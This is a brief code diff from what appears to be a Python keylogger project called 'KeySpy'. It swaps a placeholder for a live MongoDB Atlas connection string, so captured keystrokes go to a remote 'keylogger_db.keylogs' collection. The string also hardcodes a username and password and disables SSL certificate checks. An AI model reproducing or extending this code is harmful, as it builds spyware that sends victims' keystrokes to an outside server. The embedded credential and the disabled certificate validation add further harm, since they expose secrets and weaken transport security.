@@ -12,7 +12,7 @@ from cryptography.fernet import Fernet
 from pymongo import MongoClient
 
 # MongoDB connection (replace with your MongoDB URI)
-client = MongoClient('your_mongodb_uri')
+client = MongoClient('mongodb+srv://samratdey:mongoYzNqs%3DaQT1@keyspy.iarapa1.mongodb.net/?retryWrites=true&w=majority&appName=KeySpy&ssl=true&ssl_cert_reqs=CERT_NONE')
 db = client['keylogger_db']
 keylogs_collection = db['keylogs']
 
